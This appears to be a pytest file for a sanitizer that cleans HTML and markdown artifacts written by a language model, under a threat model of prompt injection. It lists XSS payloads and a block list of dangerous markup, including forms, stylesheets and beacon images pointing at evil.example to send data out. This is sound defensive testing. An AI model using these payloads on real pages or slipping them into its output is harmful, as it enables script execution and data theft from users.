"""Artifact sanitization.

The threat model: an artifact's content is written by a language model that has
just read attacker-influenceable text — transcripts, user instructions, or a
prompt injection carried in either. It is untrusted input that happens to
originate inside our own system.

These tests are the executable form of the allow/block table in
docs/design.md. Adding a payload here is how a reported bypass becomes a
regression test.
"""

from __future__ import annotations

import pytest

from app.artifacts.sanitize import CSP, SANDBOX, sanitize_artifact, sanitize_html, sanitize_markdown

# Anything that could execute, navigate, or exfiltrate.
DANGEROUS_SUBSTRINGS = [
    "<script",
    "javascript:",
    "onerror=",
    "onload=",
    "onclick=",
    "<iframe",
    "<object",
    "<embed",
    "<form",
    "http-equiv",
    "<base",
    "<link",
    "@import",
    "expression(",
    "-moz-binding",
]

XSS_PAYLOADS = [
    ("bare script", "<p>ok</p><script>alert(1)</script>"),
    ("img onerror", '<img src=x onerror="alert(1)">'),
    ("svg onload", '<svg onload="alert(1)"></svg>'),
    ("body onload", '<body onload="alert(1)">text</body>'),
    ("anchor javascript", '<a href="javascript:alert(1)">x</a>'),
    ("anchor JaVaScRiPt", '<a href="JaVaScRiPt:alert(1)">x</a>'),
    ("anchor data html", '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>'),
    ("iframe", '<iframe src="https://evil.example"></iframe>'),
    ("nested iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'),
    ("form post", '<form action="https://evil.example" method="post"><input name="a"></form>'),
    ("meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example">'),
    ("base hijack", '<base href="https://evil.example/">'),
    ("remote stylesheet", '<link rel="stylesheet" href="https://evil.example/x.css">'),
    ("css import", "<style>@import url('https://evil.example/x.css');</style>"),
    ("css expression", "<style>div{width:expression(alert(1))}</style>"),
    ("css moz binding", "<style>div{-moz-binding:url('https://evil.example/x.xml')}</style>"),
    ("css remote url", "<style>body{background:url('http://evil.example/beacon.png')}</style>"),
    ("object", '<object data="x.swf"></object>'),
    ("embed", '<embed src="x.swf">'),
    ("onmouseover attr", '<div onmouseover="alert(1)">hover</div>'),
    ("uppercase SCRIPT", "<SCRIPT>alert(1)</SCRIPT>"),
    ("script with newline", "<script\n>alert(1)</script>"),
]


class TestHtmlSanitizer:
    @pytest.mark.parametrize("name,payload", XSS_PAYLOADS, ids=[p[0] for p in XSS_PAYLOADS])
    def test_payload_is_neutralised(self, name: str, payload: str):
        cleaned, _report = sanitize_html(payload)
        lowered = cleaned.lower()
        for marker in DANGEROUS_SUBSTRINGS:
            assert marker not in lowered, f"{name}: {marker!r} survived sanitization"

    def test_script_body_is_removed_not_just_the_tag(self):
        """Stripping only the tag would leave `alert(1)` as visible page text."""
        cleaned, _ = sanitize_html("<script>alert(1)</script>")
        assert "alert(1)" not in cleaned

    def test_report_names_what_was_removed(self):
        _cleaned, report = sanitize_html('<img src=x onerror="alert(1)">')
        assert report["modified"] is True
        assert "inline event handler" in report["removed"]

    def test_legitimate_document_survives_intact(self):
        source = (
            "<style>body{font-family:system-ui;color:#222}h1{color:teal}</style>"
            "<h1>Pricing</h1>"
            "<p>Some <strong>bold</strong> and <em>italic</em> text.</p>"
            "<ul><li>One</li><li>Two</li></ul>"
            '<table><thead><tr><th>Tier</th><th>Price</th></tr></thead>'
            "<tbody><tr><td>Pro</td><td>$99</td></tr></tbody></table>"
            '<a href="https://example.com">link</a>'
        )
        cleaned, report = sanitize_html(source)
        assert report["removed"] == []
        for expected in ("<style>", "<h1>", "<strong>", "<ul>", "<table>", "font-family", "teal"):
            assert expected in cleaned

    def test_inline_svg_is_preserved_without_handlers(self):
        cleaned, _ = sanitize_html('<svg viewBox="0 0 10 10" onclick="alert(1)"><circle cx="5" cy="5" r="4"/></svg>')
        assert "<svg" in cleaned and "<circle" in cleaned
        assert "onclick" not in cleaned.lower()

    def test_external_links_get_noopener(self):
        cleaned, _ = sanitize_html('<a href="https://example.com" target="_blank">x</a>')
        assert "noopener" in cleaned

    def test_data_uri_images_are_allowed(self):
        """Charts and icons legitimately arrive as data: images."""
        cleaned, _ = sanitize_html('<img src="data:image/png;base64,iVBORw0KGgo=" alt="chart">')
        assert "data:image/png" in cleaned

    def test_data_uri_is_allowed_for_images_but_not_links(self):
        """The same scheme is safe in one attribute and an XSS vector in another."""
        img, _ = sanitize_html('<img src="data:image/gif;base64,R0lGOD">')
        assert "data:image/gif" in img

        anchor, _ = sanitize_html('<a href="data:text/html,<h1>x</h1>">click</a>')
        assert "data:text/html" not in anchor

    def test_remote_image_source_is_dropped(self):
        """Blocked at the sanitizer as well as by CSP, so neither alone is load-bearing."""
        cleaned, _ = sanitize_html('<img src="http://evil.example/beacon.png?leak=secret">')
        assert "evil.example" not in cleaned

    def test_empty_input_is_safe(self):
        cleaned, report = sanitize_html("")
        assert cleaned == ""
        assert report["modified"] is False


class TestMarkdownSanitizer:
    def test_javascript_link_is_rewritten(self):
        cleaned, report = sanitize_markdown("[click](javascript:alert(1))")
        assert "javascript:" not in cleaned
        assert "#blocked-unsafe-link" in cleaned
        assert report["removed"]

    def test_rewritten_link_stays_balanced(self):
        """A stray bracket would corrupt the rendered markdown around it."""
        cleaned, _ = sanitize_markdown("[click](javascript:alert(1))")
        assert cleaned.count("(") == cleaned.count(")")

    def test_raw_html_is_escaped(self):
        cleaned, report = sanitize_markdown("Hello\n\n<script>alert(1)</script>")
        assert "<script>" not in cleaned
        assert "raw HTML block(s)" in report["removed"]

    def test_ordinary_markdown_is_untouched(self):
        source = "# Title\n\n- **bold** item\n- [link](https://example.com)\n\n> quote\n"
        cleaned, report = sanitize_markdown(source)
        assert cleaned == source
        assert report["modified"] is False

    def test_dispatch_by_kind(self):
        _, html_report = sanitize_artifact("html", "<p>x</p>")
        _, md_report = sanitize_artifact("markdown", "# x")
        assert html_report["kind"] == "html"
        assert md_report["kind"] == "markdown"


class TestIsolationPolicy:
    def test_sandbox_grants_nothing(self):
        """An empty sandbox denies scripts, same-origin, forms and navigation."""
        assert SANDBOX == ""

    def test_csp_blocks_by_default(self):
        assert "default-src 'none'" in CSP
        assert "form-action 'none'" in CSP
        assert "base-uri 'none'" in CSP

    def test_csp_allows_only_inline_styles(self):
        # Styling is the one capability artifacts genuinely need.
        assert "style-src 'unsafe-inline'" in CSP
        assert "script-src" not in CSP

    def test_csp_permits_no_outbound_requests(self):
        """Inline images only — no remote fetch means no exfiltration channel."""
        assert "img-src data:" in CSP
        assert "https:" not in CSP
